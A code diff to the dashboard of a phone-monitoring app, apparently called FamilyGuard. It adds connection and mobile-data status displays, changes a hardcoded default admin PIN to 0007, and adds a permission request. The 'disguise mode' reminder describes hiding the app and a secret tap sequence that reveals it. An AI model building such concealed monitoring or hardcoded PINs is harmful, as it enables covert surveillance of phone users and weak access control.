@@ -568,12 +568,45 @@ async function loadDashboard() {
     
     document.getElementById('deviceName').textContent = device.name || 'Unknown';
     document.getElementById('deviceModel').textContent = device.model || 'Unknown Model';
-    document.getElementById('lastSeen').textContent = `Last seen: ${formatTime(device.lastSeen)}`;
+    
+    // Update last seen with connection status
+    const lastSeenEl = document.getElementById('lastSeen');
+    const connectionStatusEl = document.getElementById('connectionStatus');
+    if (lastSeenEl) {
+      lastSeenEl.innerHTML = `Last seen: ${formatTime(device.lastSeen)} <span id="connectionStatus" style="font-weight: bold; margin-left: 8px;"></span>`;
+    }
+    
+    // Update connection status based on data and online status
+    const connStatus = document.getElementById('connectionStatus');
+    if (connStatus) {
+      // If data is off or device is not online, show Offline
+      if (device.mobileDataEnabled === false || !device.isOnline) {
+        connStatus.textContent = '• Offline';
+        connStatus.style.color = '#f44336';
+      } else {
+        connStatus.textContent = '• Online';
+        connStatus.style.color = '#4CAF50';
+      }
+    }
+    
     document.getElementById('batteryLevel').textContent = `${device.batteryLevel || device.battery || 0}%`;
     // screenTime comes in minutes from server, convert to ms for formatDuration
     const screenTimeMs = (device.screenTime || 0) * 60000;
     document.getElementById('screenTime').textContent = formatDuration(screenTimeMs);
     document.getElementById('locationStatus').textContent = device.location ? 'Active' : 'Unknown';
+    
+    // Update mobile data status
+    const dataStatusEl = document.getElementById('dataStatus');
+    if (dataStatusEl) {
+      const isDataOn = device.mobileDataEnabled;
+      if (isDataOn === true) {
+        dataStatusEl.innerHTML = '<i class="fas fa-signal" style="color: #4CAF50;"></i> Mobile Data: <span style="color: #4CAF50; font-weight: bold;">ON</span>';
+      } else if (isDataOn === false) {
+        dataStatusEl.innerHTML = '<i class="fas fa-signal-slash" style="color: #f44336;"></i> Mobile Data: <span style="color: #f44336; font-weight: bold;">OFF</span>';
+      } else {
+        dataStatusEl.innerHTML = '<i class="fas fa-signal"></i> Mobile Data: --';
+      }
+    }
     
     const statusDot = document.getElementById('statusDot');
     statusDot.className = `status-dot ${device.isOnline ? 'online' : 'offline'}`;
@@ -1416,7 +1449,7 @@ async function applyDisguiseMode() {
     if (selectedMode === 'hidden') {
       reminder = '\n\n📱 To open the hidden app:\n• Open URL: familyguard://open';
     } else if (selectedMode === 'applock') {
-      reminder = '\n\n📱 To reveal real app:\n• Tap the App Lock title 7 times quickly\n• Enter admin PIN (default: 1234)';
+      reminder = '\n\n📱 To reveal real app:\n• Tap the App Lock title 7 times quickly\n• Enter admin PIN (default: 0007)';
     }
     
     alert(`✅ Disguise mode "${selectedMode}" applied successfully!${reminder}`);
@@ -2891,6 +2924,7 @@ async function requestPermission(permissionName) {
     'overlay': 'request_overlay_permission',
     'batteryOptimization': 'request_battery_optimization_permission',
     'deviceAdmin': 'request_device_admin_permission',
+    'restrictionSettings': 'request_restriction_settings',
     'accessibility': 'request_accessibility_permission',
     'storage': 'request_storage_permission',
     'sms': 'request_sms_permission',
